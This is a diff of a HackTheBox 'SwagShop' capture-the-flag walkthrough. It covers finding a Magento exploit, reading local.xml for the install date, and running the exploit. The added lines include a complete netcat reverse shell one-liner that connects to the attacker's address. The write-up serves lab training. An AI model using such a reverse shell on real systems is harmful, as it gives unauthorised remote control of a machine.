@@ -66,7 +66,10 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
   - Searchsploit
 ![image](https://user-images.githubusercontent.com/83878909/230576847-3317eaae-ea23-4d19-9f95-53fb7da677db.png)
-  - Modify Exploit (username, password and install date)
+  - Modify Exploit (username, password and install date) The original exploit did not work, modified exploit is in my Exploits repository.
   - Retrieve install date: `http://swagshop.htb/app/etc/local.xml`
 ![image](https://user-images.githubusercontent.com/83878909/230707818-894e563e-de27-4c7a-b528-cf3ec299b1cc.png)
   - Run Exploit
+  - Reverse Shell(Bash): `"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 9001 >/tmp/f"`
+![image](https://user-images.githubusercontent.com/83878909/230712785-8d0eb9cb-b64b-458b-9764-0cee1e3cedfc.png)
+
